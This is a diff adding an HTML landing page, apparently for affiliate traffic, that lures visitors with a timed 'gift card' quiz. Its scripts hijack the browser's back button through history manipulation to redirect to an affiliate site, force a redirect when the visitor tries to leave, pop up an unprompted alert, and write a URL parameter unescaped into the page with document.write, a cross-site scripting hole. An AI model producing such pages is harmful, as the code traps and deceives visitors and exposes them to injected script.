@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<title>Kumpletuhin ang pagsubok!</title>
+	<link rel="stylesheet" href="style.css">
+	<script>
+	function getURLParameter(name) {
+		return decodeURIComponent(
+			(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''   /*登陆页面脚本*/
+		); 
+	}
+	</script>
+</head>
+<body>
+
+	<div class="main">
+		
+		<h1>Complete the test in the next <span class="timer" id="timer"></span> seconds</h1>
+
+		<p><img src="gift_card.jpg" class="image"></p>
+
+		<h2>and see if you win a GIFT CARD!</h2>
+
+		<p class="text-left list-text">
+			1. Answer a few simple questions<br>
+			2. You will see your results immediately<br>
+			3. Check if you won a GIFT CARD!
+		</p>
+		<p><a href="YOUR_CLICK_URL_HERE" class="cta-button">PLAY NOW!</a></p>
+		<p>you live in the city of <script>document.write(getURLParameter('city'))</script></p>
+		<button onclick="go();">CLICK ME</button>
+	</div>
+	
+
+
+	<script src="jquery-3.6.0.min.js"></script>
+	<script src="main.js"></script>
+
+	<script type="text/javascript">
+		setTimeout(function (){ alert('Pansin!'); }, 500); 
+	</script>
+
+	<script>
+	(function(window, location) {
+	history.replaceState(null, document.title, location.pathname+"#!/history");		/*后退脚本*/
+	history.pushState(null, document.title, location.pathname);
+	
+	window.addEventListener("popstate", function() {
+	  if(location.hash === "#!/history") {
+		history.replaceState(null, document.title, location.pathname);
+		setTimeout(function(){
+		  location.replace("http://afflift.com");
+		},0);
+	  }
+	}, false);
+	}(window, location));
+	</script>
+	<script>
+		var redirecting = false;
+		
+		window.onbeforeunload = function() {
+		
+			if (redirecting) return;
+		
+			setTimeout(function() {
+		
+				window.top.location.href = 'https://www.google.com';		/*绑架脚本*/
+		
+				setTimeout(function() {
+					redirecting = true;
+				}, 1000);
+		
+		
+			}, 1);
+		
+		};
+	</script>
+	<script>
+			function go() {
+				window.onbeforeunload = null;
+				window.location = 'https://www.baidu.com';	/*触发的 CTA 按钮*/
+			}
+	</script>
+</body>
+</html>
